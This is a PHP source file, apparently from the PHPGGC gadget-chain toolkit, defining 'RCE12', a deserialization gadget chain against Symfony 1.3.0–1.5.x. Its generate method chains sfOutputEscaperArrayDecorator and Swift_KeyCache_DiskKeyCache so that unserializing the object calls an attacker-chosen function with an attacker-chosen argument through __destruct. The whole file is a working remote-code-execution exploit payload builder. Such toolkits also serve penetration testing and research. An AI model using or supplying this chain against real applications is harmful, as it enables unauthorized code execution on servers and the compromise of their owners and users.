<?php

namespace GadgetChain\Symfony;

class RCE12 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    // This chain is still valid for latest version of Symfony 1.15 if it's installed with git clone
    // which triggers submodules (not via composer)
    public static $version = '1.3.0 < 1.5.13~17';
    public static $vector = '__destruct';
    public static $author = 'darkpills';

    public function generate(array $parameters)
    {
        $cacheKey = "1";
        $keys = new \sfOutputEscaperArrayDecorator($parameters['function'], array($cacheKey => $parameters['parameter']));

        // a rmdir($path . '/' $cacheKey) will be done by Swift_KeyCache_DiskKeyCache::clearAll() 
        // so put something that will never exists to avoid issues
        $path = "thispathshouldneverexists";
        $cache = new \Swift_KeyCache_DiskKeyCache($keys, $path);

        return $cache;
    }

  
}
